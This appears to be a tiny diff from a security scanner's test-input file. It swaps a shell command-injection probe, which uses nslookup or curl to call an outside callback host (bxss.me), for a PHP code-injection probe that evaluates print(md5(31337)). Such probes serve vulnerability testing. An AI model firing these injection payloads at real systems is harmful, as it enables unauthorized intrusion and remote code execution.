@@ -1,1 +1,1 @@
-`(nslookup -q=cname hitvqqhbedykmcfa44.bxss.me||curl hitvqqhbedykmcfa44.bxss.me)`
+${@print(md5(31337))}\
